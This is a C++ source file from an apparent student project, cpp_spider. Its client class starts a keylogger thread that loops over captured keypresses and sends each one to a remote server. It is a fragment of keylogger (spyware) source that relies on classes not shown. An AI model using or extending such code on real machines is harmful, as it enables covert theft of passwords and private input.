/*
** Client.cpp for cpp_spider in /home/tarkick/repos/cpp_spider/src/client
**
** Made by tarkick
** Login   <tarkick@epitech.net>
**
** Started on  Sat Nov 05 19:28:05 2016 tarkick
** Last update Wed Nov 09 01:46:41 2016 tarkick
*/

#include "Client.hh"

Client::Client(std::string ip, unsigned int port) : Network<CLIENT>(ip, port,
													CLIENT)
{
	std::cout << std::setw(20) << "CPP_SPIDER CLIENT" << std::endl;
	keyloggerThread_ = new boost::thread(boost::bind(&Client::sendKeyLogs, this));
	run();
	keyloggerThread_->join();
}

Client::~Client()
{
}

void 			Client::processing()
{
}

void 			Client::sendKeyLogs()
{
	send(Net::Packet<SERVER>(Net::Opcode::Client::LOGGING));
	while (true)
	{
		Keylog key = keylogger_.getKeyPressed();
		if (key.getType() != Keylog::NONE)
		{
			if (connected_)
				send(Packet<Net::Type::SERVER>(key));
			else if (!connected_)
				Packet<Net::Type::SERVER>(key).print();
		}
	}
}
